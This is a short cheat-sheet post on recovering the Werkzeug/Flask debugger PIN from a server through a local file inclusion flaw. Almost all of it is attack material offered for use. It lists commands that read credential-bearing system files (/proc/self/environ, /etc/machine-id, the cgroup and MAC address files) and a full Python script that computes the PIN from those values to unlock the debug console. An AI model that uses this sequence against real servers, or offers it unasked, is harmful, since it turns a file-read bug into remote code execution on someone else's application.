---
title: "Retrieve Flask Debug Pin"
date: 2024-7-12
tags: ["python", "flask", "werkzeug", "debug", "LFI"]
---

---
### Retrieve Flask Debug Pin

#### 1. Get user

<div>

```bash
cat /proc/self/environ | grep -aE ('USER'|'LOGNAME')
```

</div>

#### 2. Get full path of the application

<div>

```
+------------------------------+
| Get from Traceback debug log |
+------------------------------+
```

</div>

#### 3. Get MAC address

<div>

```bash
cat /sys/class/net/eth0/address
```

```bash
# Convert to int
python3 -c "print(int('<MAC_ADDRESS>'.replace(':',''), 16))"
```

</div>

#### 4. Create Machine ID String

<div>

```bash
echo $(cat /etc/machine-id)$(head -n 1 /proc/self/cgroup | rev | cut -d '/' -f1 | rev)
```

</div>

#### 5. Update public and private bits in Hacktrick's Script

<div>

```python
#!/usr/bin/env python3

import hashlib
from itertools import chain

probably_public_bits = [
    'user',       # username
    'flask.app',  # modname (should be flask.app)
    'Flask',      # Flask / wsgi_app / DebuggedApplication
    '/app/venv/lib/python3.10/site-packages/flask/app.py'  # full path of the app
]

private_bits = [
    '279275995014060',                  # Mac address
    'd4e6cb65d59544f3331ea0425dc555a1'  # machine_id string
]

h = hashlib.sha1()

for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

</div>

<br>